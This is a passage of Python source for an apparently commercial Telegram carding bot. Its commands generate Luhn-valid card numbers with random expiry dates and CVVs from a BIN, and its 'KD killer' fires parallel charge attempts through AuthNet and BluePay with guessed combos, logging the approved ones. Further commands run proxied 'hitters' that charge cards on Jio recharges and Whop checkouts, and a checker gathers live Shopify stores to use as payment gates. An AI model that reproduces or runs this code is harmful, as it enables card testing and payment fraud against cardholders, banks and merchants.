        cf_str = f"{premium_emoji_tag('⚠️')} Yes" if result['cloudflare'] else f"{premium_emoji_tag('✅')} No"
        cap_str = f"{premium_emoji_tag('⚠️')} Yes" if result['captcha'] else f"{premium_emoji_tag('✅')} No"
        gql_str = f"{premium_emoji_tag('✅')} Yes" if result['graphql'] else "No"

        final_raw = (
            f"{premium_emoji_tag('🔍')} **URL Analysis**\n\n"
            f"{premium_emoji_tag('🌐')} **URL:** {{{{code:{url[:60]}}}}}{'...' if len(url) > 60 else ''}\n"
            f"{premium_emoji_tag('⚡')} **Status:** {http_line}\n\n"
            f"{premium_emoji_tag('💳')} **Gateways:** {gateways_str}\n"
            f"{premium_emoji_tag('🛍️')} **Platform:** {platform_str}\n"
            f"{premium_emoji_tag('🛡️')} **Cloudflare:** {cf_str}\n"
            f"{premium_emoji_tag('🔌')} **Captcha:** {cap_str}\n"
            f"{premium_emoji_tag('⚙️')} **GraphQL:** {gql_str}\n\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(update.effective_user.first_name or update.effective_user.username or 'User')}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await status_msg.edit_text(f_text, entities=f_ents)
    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)


# ==================== CC GENERATOR ====================
def _luhn_checksum(number: str) -> int:
    digits = [int(d) for d in reversed(number)]
    odd_digits = digits[0::2]
    even_digits = digits[1::2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def _luhn_complete(partial: str) -> str:
    """Complete a partial CC number with a check digit using Luhn."""
    for check in range(10):
        candidate = partial + str(check)
        if _luhn_checksum(candidate) == 0:
            return candidate
    return partial + '0'

def _amex_luhn_complete(partial: str) -> str:
    """Complete a 14-digit partial to valid 15-digit Amex number."""
    for check in range(10):
        candidate = partial + str(check)
        if _luhn_checksum(candidate) == 0:
            return candidate
    return partial + '0'

def _generate_ccs(bin_input: str, count: int = 10):
    """
    Generate CCs from a BIN prefix:
    - 6 digits  → generate full CC + month + year + CVV
    - 8+ digits → use as prefix, fill rest randomly
    - Amex (starts with 3) → 15-digit CC, 4-digit CVV
    - Others → 16-digit CC, 3-digit CVV
    Months/years auto-generated if not supplied in bin_input.
    """
    # Parse input: could be  BIN  or  BIN|MM  or  BIN|MM|YY
    parts = bin_input.strip().split('|')
    raw_bin = parts[0].replace(' ', '').replace('-', '')
    fixed_mm = parts[1].strip().zfill(2) if len(parts) > 1 and parts[1].strip() else None
    fixed_yy = parts[2].strip() if len(parts) > 2 and parts[2].strip() else None
    if fixed_yy and len(fixed_yy) == 4:
        fixed_yy = fixed_yy[2:]   # store as 2-digit

    is_amex = raw_bin.startswith('3')
    cc_total_len = 15 if is_amex else 16
    cvv_len = 4 if is_amex else 3

    results = []
    for _ in range(count):
        # Build CC
        prefix = raw_bin
        # How many random digits needed before check digit
        # cc_total_len - 1 digits then Luhn check digit
        need = cc_total_len - 1 - len(prefix)
        if need < 0:
            # BIN longer than expected, truncate to cc_total_len - 1
            prefix = prefix[:cc_total_len - 1]
            need = 0
        middle = ''.join([str(random.randint(0, 9)) for _ in range(need)])
        partial = prefix + middle
        if is_amex:
            cc = _amex_luhn_complete(partial)
        else:
            cc = _luhn_complete(partial)

        # Month
        if fixed_mm:
            mm = fixed_mm
        else:
            mm = str(random.randint(1, 12)).zfill(2)

        # Year (2-digit stored, display as 4-digit)
        if fixed_yy:
            yy2 = fixed_yy
        else:
            yy2 = str(random.randint(25, 30))
        yy4 = '20' + yy2

        # CVV
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_len)])

        results.append(f"{cc}|{mm}|{yy4}|{cvv}")
    return results


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate 10 CCs from a BIN — /gen <bin> or /gen <bin>|MM|YY"""
    user_id = update.effective_user.id
    track_user(user_id)
    bin_input = ""
    parts = update.message.text.split(maxsplit=1)
    if len(parts) > 1:
        bin_input = parts[1].strip()
    elif update.message.reply_to_message and (update.message.reply_to_message.text or update.message.reply_to_message.caption):
        reply_text = update.message.reply_to_message.text or update.message.reply_to_message.caption
        cards = extract_cc(reply_text)
        if cards:
            c_parts = cards[0].split('|')
            cc_num = c_parts[0]
            bin_num = cc_num[:8] if len(cc_num) >= 8 else cc_num[:6]
            mm = c_parts[1] if len(c_parts) > 1 else ""
            yy = c_parts[2] if len(c_parts) > 2 else ""
            bin_input = bin_num
            if mm:
                bin_input += f"|{mm}"
                if yy:
                    bin_input += f"|{yy}"
        else:
            digits = re.findall(r'\d+', reply_text)
            for d in digits:
                if len(d) >= 6:
                    bin_input = d
                    break

    if not bin_input:
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('🔌')} **{bold_sans('CC Generator Usage:')}**\n"
            f" ⇾ {{{{code:/gen 424242}}}} — 6-digit BIN\n"
            f" ⇾ {{{{code:/gen 424242|08|28}}}} — BIN with fixed MM/YY\n"
            f" ⇾ Reply to a card or message containing a BIN!"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    raw_bin = bin_input.split('|')[0].replace(' ', '').replace('-', '')

    if not raw_bin.isdigit() or len(raw_bin) < 6:
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} BIN must be at least 6 digits."
        )
        await update.message.reply_text(clean, entities=ents)
        return

    try:
        cards = _generate_ccs(bin_input, 10)
        bin6 = raw_bin[:6]
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin6)

        is_amex = raw_bin.startswith('3')
        cc_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3

        cards_text = '\n'.join(f"{{{{code:{c}}}}}" for c in cards)
        final_raw = (
            f"{premium_emoji_tag('🔌')} **CC Generator**\n\n"
            f"{premium_emoji_tag('💳')} **BIN:** {{{{code:{bin6}}}}}\n"
            f"{premium_emoji_tag('⚙️')} **Format:** {cc_len}-digit | CVV {cvv_len}-digit\n\n"
            f"{cards_text}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('👤')} **Generated by:** {{{{link|tg://user?id={user_id}|{bold_sans(update.effective_user.first_name or update.effective_user.username or 'User')}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await update.message.reply_text(f_text, entities=f_ents)
    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await update.message.reply_text(clean_err, entities=ents_err)



# ==================== KD KILLER ====================
KD_COMBO_COUNT = 7
def _generate_kd_combos(orig_mm, orig_yy, orig_cvv, count=7):
    from datetime import datetime
    now = datetime.now()
    curr_yr_2d = now.year % 100
    curr_mon = now.month
    
    combos = [(orig_mm, orig_yy, orig_cvv)]
    used = {(orig_mm, orig_yy, orig_cvv)}
    
    while len(combos) < count:
        yy_val = random.randint(curr_yr_2d, curr_yr_2d + 6)
        if yy_val == curr_yr_2d:
            mm_val = random.randint(curr_mon, 12)
        else:
            mm_val = random.randint(1, 12)
            
        mm = f"{mm_val:02d}"
        yy = f"{yy_val:02d}"
        cvv = f"{random.randint(0,999):03d}"
        
        if (mm, yy, cvv) not in used:
            used.add((mm, yy, cvv))
            combos.append((mm, yy, cvv))
    return combos

async def _run_kd_gate(gate, cc, combos, name):
    async def _check_one(mm, yy, cvv):
        card_str = f"{cc}|{mm}|{yy}|{cvv}"
        try:
            resp = await gate(card_str)
            msg = resp.get('Response', str(resp))[:100] if isinstance(resp, dict) else str(resp)[:100]
        except Exception as e:
            msg = f"Error: {e}"
        status = classify_gate_response(msg)
        hit = status in ('Charged', 'Approved')
        # Clean up the response message for display
        clean_msg = msg.replace('\n', ' ').replace('\r', '').strip()
        if len(clean_msg) > 60:
            clean_msg = clean_msg[:60] + '...'
        return {'combo': f"{mm}/{yy}|{cvv}", 'response': clean_msg, 'approved': hit, 'gate': name, 'status': status}
    # Fire ALL combos in parallel — 7 workers simultaneously
    tasks = [_check_one(mm, yy, cvv) for mm, yy, cvv in combos]
    results = await asyncio.gather(*tasks)
    return list(results)

async def kd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("Premium only.")
        return

    cc_text = ""
    msg_parts = update.message.text.split(' ', 1)
    if len(msg_parts) > 1:
        cc_text = msg_parts[1]
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text
    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/kd card|mm|yy|cvv}}}} or reply to a card")
        await update.message.reply_text(clean, entities=ents)
        return
    card = cards[0]
    parts = card.split('|')
    cc, om, oy, ocvv = parts[0], parts[1], parts[2][-2:], parts[3]
    if not cc.startswith('4'):
        await update.message.reply_text("VISA cards only.")
        return
    brand, bt, lvl, bank, country, flag = await get_bin_info(cc)
    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')}")
    proc = await update.message.reply_text(clean_p, entities=ents_p)
    user_processing[user_id] = True
    start_t = time.time()
    try:
        combos_a = _generate_kd_combos(om, oy, ocvv)
        combos_b = _generate_kd_combos(om, oy, ocvv)
        # Run BOTH gates in PARALLEL — 7+7 = 14 requests simultaneously
        res_a, res_b = await asyncio.gather(
            _run_kd_gate(check_authnet_charge, cc, combos_a, 'AuthNet'),
            _run_kd_gate(check_bluepay_charge, cc, combos_b, 'BluePay')
        )
        elapsed = round(time.time() - start_t, 2)
        all_res = res_a + res_b
        # Determine header based on actual results
        any_hit = any(r['approved'] for r in all_res)
        hit_count = sum(1 for r in all_res if r['approved'])
        if any_hit:
            header = f"{premium_emoji_tag('✅')} {bold_sans('KILLED SUCCESSFULLY')} {premium_emoji_tag('✅')}"
        else:
            header = f"{premium_emoji_tag('❌')} {bold_sans('CARD IS DEAD')} {premium_emoji_tag('❌')}"
        msg = (
            f"{premium_emoji_tag('💀')} **𝐊𝐃 𝐊𝐈𝐋𝐋𝐄𝐑 𝐑𝐄𝐒𝐔𝐋𝐓** {premium_emoji_tag('💀')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{header}\n\n"
            f"{premium_emoji_tag('💳')} **𝐂𝐚𝐫𝐝** ➔ {{{{code:{card}}}}}\n"
            f"{premium_emoji_tag('📍')} **𝐁𝐈𝐍** ➔ {brand} {bt} {lvl}\n"
            f"{premium_emoji_tag('🏦')} **𝐁𝐚𝐧𝐤** ➔ {bank}\n"
            f"{premium_emoji_tag('🌍')} **𝐂𝐨𝐮𝐧𝐭𝐫𝐲** ➔ {country} {flag}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{premium_emoji_tag('⏱️')} **𝐓𝐢𝐦𝐞** ➔ {elapsed}s\n"
            f"{premium_emoji_tag('👑')} **𝐃𝐞𝐯** ➔ {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        clean, ents = build_entities_with_custom_emojis(msg)
        await proc.edit_text(clean, entities=ents)

        with open('kd_approved.txt', 'a', encoding='utf-8') as f:
            for r in all_res:
                if r['approved']:
                    f.write(f"{r['combo']} | {r['gate']} | {r['response']}\n")
    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await proc.edit_text(clean_err, entities=ents_err)
    finally:
        user_processing.pop(user_id, None)

# ==================== JIO RECHARGE HITTER ====================
async def jio_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} {bold_sans('Premium only!')}\n"
            f"{premium_emoji_tag('👑')} {bold_sans('Buy Premium for access to hitters.')}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    parts = update.message.text.split(None, 2)  # /jio <phone> <card>
    phone_number = ""
    cc_text = ""
    if len(parts) >= 3:
        phone_number = parts[1].strip()
        cc_text = parts[2].strip()
    elif len(parts) == 2:
        # Could be /jio <phone> with card in reply
        phone_number = parts[1].strip()
        if update.message.reply_to_message and update.message.reply_to_message.text:
            cc_text = update.message.reply_to_message.text
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text

    if not phone_number or len(phone_number) < 10:
        clean, ents = build_entities_with_custom_emojis(
            f"Usage: {{{{code:/jio <phone> card|mm|yy|cvv}}}}\n"
            f"Example: {{{{code:/jio 9876543210 5131xxxx|03|30|086}}}}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(
            f"Usage: {{{{code:/jio <phone> card|mm|yy|cvv}}}}\n"
            f"Example: {{{{code:/jio 9876543210 5131xxxx|03|30|086}}}}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    card = cards[0]
    # Get proxy from user's saved proxies
    proxies = load_user_proxies(user_id)
    proxy = random.choice(proxies) if proxies else None

    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')} {bold_sans('Processing Jio Recharge...')}")
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    user_processing[user_id] = True
    start_t = time.time()
    try:
        res = await jio_recharge_check(card, phone_number, proxy)
        elapsed = round(time.time() - start_t, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        resp_msg = str(res.get('message', 'No response'))
        rl = resp_msg.lower()

        # Determine status header
        if res['status'] == 'Charged':
            jio_header = f"{premium_emoji_tag('💎')} **Recharge Successful!**"
        elif res['status'] == '3DS':
            jio_header = f"{premium_emoji_tag('🔐')} **3DS / OTP Required — Card is Live!**"
        elif res['status'] == 'Approved':
            if 'insufficient' in rl:
                jio_header = f"{premium_emoji_tag('✨')} **Insufficient Funds — CVV Matched!**"
            elif 'cvc' in rl or 'cvv' in rl:
                jio_header = f"{premium_emoji_tag('🔥')} **Incorrect CVC — CCN Matched!**"
            else:
                jio_header = f"{premium_emoji_tag('✅')} **Card Approved**"
        elif res['status'] == 'Declined':
            jio_header = f"{premium_emoji_tag('❌')} **Card Declined**"
        else:
            jio_header = f"{premium_emoji_tag('⚠️')} **Gate Error**"

        display_name = update.effective_user.first_name or update.effective_user.username or f"user_{user_id}"
        final_raw = (
            f"{jio_header}\n\n"
            f"{premium_emoji_tag('💳')} **CC:** {{{{spoiler:{card}}}}}\n"
            f"{premium_emoji_tag('📱')} **Gate:** Jio Recharge\n"
            f"{premium_emoji_tag('📞')} **Number:** {phone_number}\n"
            f"{premium_emoji_tag('💬')} **Response:** {sanitize_response(resp_msg)}\n"
            f"{premium_emoji_tag('💰')} **Amount:** {res.get('price', '-')}\n"
            f"{premium_emoji_tag('📋')} **Plan:** {res.get('plan', '-')}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('⏱️')} **Time:** {elapsed}s\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(display_name)}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await status_msg.edit_text(f_text, entities=f_ents)

        # Hit log for Jio
        if res['status'] == 'Charged':
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Charged', 'Jio Recharge', res.get('price', '-'), resp_msg, username, user_id)
        elif res['status'] in ('Approved', '3DS'):
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Approved', 'Jio Recharge', res.get('price', '-'), resp_msg, username, user_id)

    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)
    finally:
        user_processing.pop(user_id, None)


# ==================== WHOP CHECKOUT HITTER ====================
async def whop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} {bold_sans('Premium only!')}\n"
            f"{premium_emoji_tag('👑')} {bold_sans('Buy Premium for access to hitters.')}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    parts = update.message.text.split(None, 2)  # /whop <url> <card>
    whop_url = ""
    cc_text = ""
    if len(parts) >= 3:
        whop_url = parts[1].strip()
        cc_text = parts[2].strip()
    elif len(parts) == 2:
        whop_url = parts[1].strip()
        if update.message.reply_to_message and update.message.reply_to_message.text:
            cc_text = update.message.reply_to_message.text
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text

    if not whop_url or ('whop' not in whop_url.lower() and not whop_url.startswith('http')):
        clean, ents = build_entities_with_custom_emojis(
            f"Usage: {{{{code:/whop <url> card|mm|yy|cvv}}}}\n"
            f"Example: {{{{code:/whop https://whop.com/example/ 5131xxxx|03|30|086}}}}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(
            f"Usage: {{{{code:/whop <url> card|mm|yy|cvv}}}}\n"
            f"Example: {{{{code:/whop https://whop.com/example/ 5131xxxx|03|30|086}}}}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    card = cards[0]
    # Get proxy from user's saved proxies
    proxies = load_user_proxies(user_id)
    proxy = random.choice(proxies) if proxies else None

    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')} {bold_sans('Processing Whop Checkout...')}")
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    user_processing[user_id] = True
    start_t = time.time()
    try:
        res = await whop_check(card, whop_url, proxy)
        elapsed = round(time.time() - start_t, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        resp_msg = str(res.get('message', 'No response'))
        rl = resp_msg.lower()

        # Determine status header
        if res['status'] == 'Charged':
            whop_header = f"{premium_emoji_tag('💎')} **Payment Successful!**"
        elif res['status'] == '3DS':
            whop_header = f"{premium_emoji_tag('🔐')} **3DS / OTP Required — Card is Live!**"
        elif res['status'] == 'Approved':
            if 'insufficient' in rl:
                whop_header = f"{premium_emoji_tag('✨')} **Insufficient Funds — CVV Matched!**"
            elif 'cvc' in rl or 'cvv' in rl:
                whop_header = f"{premium_emoji_tag('🔥')} **Incorrect CVC — CCN Matched!**"
            else:
                whop_header = f"{premium_emoji_tag('✅')} **Card Approved**"
        elif res['status'] == 'Declined':
            whop_header = f"{premium_emoji_tag('❌')} **Card Declined**"
        else:
            whop_header = f"{premium_emoji_tag('⚠️')} **Gate Error**"

        # Parse domain from whop URL
        from urllib.parse import urlparse as _urlparse
        _domain = _urlparse(whop_url).netloc or whop_url
        _domain = _domain.replace('www.', '')[:40]

        display_name = update.effective_user.first_name or update.effective_user.username or f"user_{user_id}"
        final_raw = (
            f"{whop_header}\n\n"
            f"{premium_emoji_tag('💳')} **CC:** {{{{spoiler:{card}}}}}\n"
            f"{premium_emoji_tag('🛒')} **Gate:** Whop ({_domain})\n"
            f"{premium_emoji_tag('💬')} **Response:** {sanitize_response(resp_msg)}\n"
            f"{premium_emoji_tag('💰')} **Price:** {res.get('price', '-')}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('⏱️')} **Time:** {elapsed}s\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(display_name)}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await status_msg.edit_text(f_text, entities=f_ents)

        # Hit log for Whop
        if res['status'] == 'Charged':
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Charged', f'Whop ({_domain})', res.get('price', '-'), resp_msg, username, user_id)
        elif res['status'] in ('Approved', '3DS'):
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Approved', f'Whop ({_domain})', res.get('price', '-'), resp_msg, username, user_id)

    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)
    finally:
        user_processing.pop(user_id, None)


# ==================== CALLBACKS ====================
async def callback_pause(update, _):
    q = update.callback_query
    try:
        await q.answer()
    except BadRequest:
        pass
    key = f"{q.message.chat.id}_{q.message.message_id}"
    if key in active_sessions:
        sess = active_sessions[key]
        if q.from_user.id != sess.get('user_id') and q.from_user.id != OWNER_ID:
            try:
                await q.answer("You did not start this session!", show_alert=True)
            except BadRequest:
                pass
            return
        sess['paused'] = True
        try:
            await q.answer("Paused", show_alert=False)
        except BadRequest:
            pass
        if 'results' in sess and 'bot' in sess:
            await update_progress(sess['chat_id'], q.message.message_id, sess['results'], sess['results']['checked'], sess['bot'])

async def callback_resume(update, _):
    q = update.callback_query
    try:
        await q.answer()
    except BadRequest:
        pass
    key = f"{q.message.chat.id}_{q.message.message_id}"
    if key in active_sessions:
        sess = active_sessions[key]
        if q.from_user.id != sess.get('user_id') and q.from_user.id != OWNER_ID:
            try:
                await q.answer("You did not start this session!", show_alert=True)
            except BadRequest:
                pass
            return
        sess['paused'] = False
        try:
            await q.answer("Resumed", show_alert=False)
        except BadRequest:
            pass
        if 'results' in sess and 'bot' in sess:
            await update_progress(sess['chat_id'], q.message.message_id, sess['results'], sess['results']['checked'], sess['bot'])

async def callback_stop(update, _):
    q = update.callback_query
    try:
        await q.answer()
    except BadRequest:
        pass
    key = f"{q.message.chat.id}_{q.message.message_id}"
    if key in active_sessions:
        sess = active_sessions[key]
        if q.from_user.id != sess.get('user_id') and q.from_user.id != OWNER_ID:
            try:
                await q.answer("You did not start this session!", show_alert=True)
            except BadRequest:
                pass
            return
        sess['stopped'] = True
        try:
            await q.answer("Stopping...", show_alert=False)
        except BadRequest:
            pass
        try:
            msg = f"{premium_emoji_tag('🛑')} Stopped by user. Finishing current cards..."
            clean, ents = build_entities_with_custom_emojis(msg)
            await q.edit_message_text(clean, entities=ents)
        except Exception:
            pass
    else:
        try:
            await q.answer("No active session found.", show_alert=True)
        except BadRequest:
            pass

async def callback_pxystop(update, _):
    q = update.callback_query
    try:
        await q.answer()
    except BadRequest:
        pass
    # callback_data is pxystop_<session_key>
    session_key = q.data.replace("pxystop_", "", 1)
    if session_key in active_sessions:
        active_sessions[session_key]['stopped'] = True
        try:
            await q.answer("Stopping proxy check...", show_alert=False)
        except BadRequest:
            pass
        try:
            msg = f"{premium_emoji_tag('🛑')} Proxy check stopped by user."
            clean, ents = build_entities_with_custom_emojis(msg)
            await q.edit_message_text(clean, entities=ents)
        except Exception:
            pass
    else:
        try:
            await q.answer("No active proxy check found.", show_alert=True)
        except BadRequest:
            pass

async def menu_callbacks(update: Update, _):
    q = update.callback_query
    try:
        await q.answer()
    except BadRequest:
        pass
    data = q.data
    uid = q.from_user.id
    uname = q.from_user.username or f"user_{uid}"
    if data == "menu_main":
        text, kb = get_main_menu()
    elif data == "menu_gate":
        text, kb = get_gate_menu()
    elif data == "menu_gate_auth":
        text, kb = get_gate_auth_menu()
    elif data == "menu_gate_charge":
        text, kb = get_gate_charge_menu()
    elif data == "menu_mass":
        text, kb = get_mass_menu()
    elif data == "menu_hitter":
        text, kb = get_hitter_menu()
    elif data == "menu_profile":
        text, kb = get_profile_menu(uid, uname)
    elif data == "menu_pricing":
        text, kb = get_pricing_menu()
    elif data == "menu_tools":
        text, kb = get_tools_menu()
    else:
        return
    clean, ents = build_entities_with_custom_emojis(text)
    try:
        if q.message and q.message.photo:
            await q.edit_message_caption(caption=clean, caption_entities=ents, reply_markup=kb)
        else:
            await q.edit_message_text(clean, entities=ents, reply_markup=kb, disable_web_page_preview=True)
    except BadRequest as e:
        # If editing fails (message deleted, etc.), try to send a new message
        try:
            if q.message and q.message.photo:
                await q.message.reply_photo(photo=q.message.photo[-1].file_id, caption=clean, caption_entities=ents, reply_markup=kb)
            else:
                await q.message.reply_text(clean, entities=ents, reply_markup=kb, disable_web_page_preview=True)
        except Exception:
            pass

# ==================== BROADCAST ====================
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Owner only.")
        return
    if update.message.reply_to_message:
        msg = update.message.reply_to_message
        all_users = get_all_user_ids()
        sent = 0
        for uid in all_users:
            if uid == OWNER_ID: continue
            try:
                await msg.forward(uid)
                sent += 1
                await asyncio.sleep(0.3)
            except: pass
        await update.message.reply_text(f"Broadcasted to {sent} users.")
    else:
        parts = update.message.text.split(' ', 1)
        if len(parts) < 2:
            await update.message.reply_text("Usage: /broadcast <message> or reply to a message.")
            return
        text = parts[1]
        all_users = get_all_user_ids()
        sent = 0
        for uid in all_users:
            if uid == OWNER_ID: continue
            try:
                await context.bot.send_message(uid, f"📢 **Broadcast**\n\n{text}")
                sent += 1
                await asyncio.sleep(0.3)
            except: pass
        await update.message.reply_text(f"Broadcasted to {sent} users.")

# ==================== SHOPIFY SITE CHECKER & MAINTENANCE ====================
async def check_shopify_site_alive(site_url: str) -> bool:
    url = site_url.strip()
    if not url:
        return False
    if not url.startswith("http"):
        url = "https://" + url
    url = url.rstrip("/")
    try:
        from curl_cffi import requests as curl_requests
        async with curl_requests.AsyncSession(impersonate="chrome", verify=False, timeout=12) as session:
            r = await session.get(f"{url}/products.json?limit=1", timeout=10)
            if r.status_code == 200:
                data = r.json()
                if "products" in data and len(data["products"]) > 0:
                    prod = data["products"][0]
                    if "variants" in prod and len(prod["variants"]) > 0:
                        return True
    except Exception:
        pass
    return False

async def sitetxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only command.")
        return

    urls_raw = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                path = f"temp_sites_{user_id}.txt"
                await download_telegram_file(context.bot, doc.file_id, path)
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    urls_raw = [line.strip() for line in (await f.read()).splitlines() if line.strip()]
                os.remove(path)
            except Exception as e:
                await update.message.reply_text(f"❌ Failed to download site file: {str(e)}")
                return
    
    if not urls_raw:
        if '\n' in update.message.text:
            urls_raw = [line.strip() for line in update.message.text.split('\n')[1:] if line.strip()]
            
    if not urls_raw:
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} Reply to a .txt file containing site URLs or send them line-by-line after {{{{code:/sitetxt}}}}."
        )
        await update.message.reply_text(clean, entities=ents)
        return

    urls_to_check = []
    seen = set()
    for u in urls_raw:
        u_clean = u.strip().rstrip("/")
        if not u_clean:
            continue
        if not u_clean.startswith("http"):
            u_clean = "https://" + u_clean
        if u_clean not in seen:
            seen.add(u_clean)
            urls_to_check.append(u_clean)

    total_to_check = len(urls_to_check)
    init_msg = f"{premium_emoji_tag('⏳')} Checking {total_to_check} sites for Shopify compatibility..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_msg)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)

    existing_sites = load_sites()
    existing_set = {s.rstrip("/") for s in existing_sites}

    sem = asyncio.Semaphore(10)
    live_sites = []
    checked_count = 0

    async def worker(site):
        nonlocal checked_count
        async with sem:
            is_live = await check_shopify_site_alive(site)
            checked_count += 1
            if is_live:
                live_sites.append(site)
            if checked_count % 10 == 0 or checked_count == total_to_check:
                try:
                    pct = int((checked_count / total_to_check) * 100)
                    progress_text = (
                        f"{premium_emoji_tag('📈')} Progress: {checked_count}/{total_to_check} [{pct}%]\n"
                        f"{premium_emoji_tag('✅')} Live Shopify: {len(live_sites)}"
                    )
                    clean_pr, ents_pr = build_entities_with_custom_emojis(progress_text)
                    await status_msg.edit_text(clean_pr, entities=ents_pr)
                except Exception:
                    pass

    await asyncio.gather(*[worker(site) for site in urls_to_check])

    added_count = 0
